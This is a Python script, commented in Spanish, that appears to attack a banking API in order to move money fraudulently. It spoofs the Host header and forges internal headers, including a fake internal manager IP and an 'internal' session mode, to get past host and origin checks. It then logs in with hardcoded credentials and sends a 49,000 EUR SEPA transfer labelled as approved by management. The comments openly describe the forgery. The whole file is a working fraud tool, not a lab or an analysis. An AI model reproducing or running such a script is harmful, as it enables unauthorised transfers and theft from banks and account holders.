import requests

# === URLs ===
base_url = "http://80.78.30.242:9181"
login_url = f"{base_url}/api/login/"
challenge_url = f"{base_url}/api/challenge"
transfer_url = f"{base_url}/api/send-transfer"

# === Credenciales ===
USER = "markmur88"
PASS = "Ptf8454Jd55"

# === Cabeceras precisas para que pase el Host check ===
session = requests.Session()

session.headers.update({
    "Host": "api.coretransapi.com",  # Este es el HOST VÁLIDO del sistema
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (Internal Browser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,text/html",
    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "X-Origin-IP": "192.168.1.10",       # IP fingida interna del gerente
    "X-Location": "OFICINA-CENTRAL-ES",   # Firma de geolocación interna
    "X-Requested-With": "XMLHttpRequest",
    "X-Session-Mode": "internal",
    "Content-Type": "application/json"
})

# === Paso 1 | Login y generación de token ===
login_data = {
    "username": USER,
    "password": PASS
}

print("\n[+] Iniciando sesión desde IP falsa con Host interno válido...")
login_response = session.post(login_url, json=login_data, headers=session.headers)

# === Si obtiene token JWT ===
if login_response.status_code == 200:
    json_response = login_response.json()
    access_token = json_response.get("access_token")
    refresh_token = json_response.get("refresh_token")

    session.headers.update({
        "Authorization": f"Bearer {access_token}",  # Usaremos el token que el backend nos da
        "X-Token-ID": access_token,
        "X-Session-Verified": "1",
    })

    print("[+] Sesión iniciada. Token obtenido:", access_token)

    # === Paso 2 | Challenge interno para validar sesión ===
    challenge_response = session.post(
        challenge_url,
        json={"token": access_token},
        headers=session.headers
    )

    print("[+] Challenge response:", challenge_response.status_code)
    print(challenge_response.text)

    # === Paso 3 | Enviar transferencia SEPA ===
    transfer_data = {
        "iban_origen": "ES8000180001234567890123",
        "iban_destino": "ES9100289392790001457822",
        "monto": "49000.00",
        "currency": "EUR",
        "reason": "Transferencia interna aprobada por gerencia"
    }

    transfer_response = session.post(
        transfer_url,
        json=transfer_data
    )

    print("\n[+] Transferencia SEPA ejecutada.")
    print("Token:", access_token)
    print("Status code transferência:", transfer_response.status_code)
    print("Respuesta:", transfer_response.text)

elif login_response.status_code == 403 or login_response.status_code == 401:
    print("[-] Error de autenticación. Respuesta:", login_response.text)

elif login_response.status_code == 400:
    print("[-] Host no permitido en la conexión. Asegúrate de falsificar Host: api.coretransapi.com")
    print("Error:", login_response.text)

else:
    print(f"[-] Error inesperado. Status: {login_response.status_code}")
    print(login_response.text)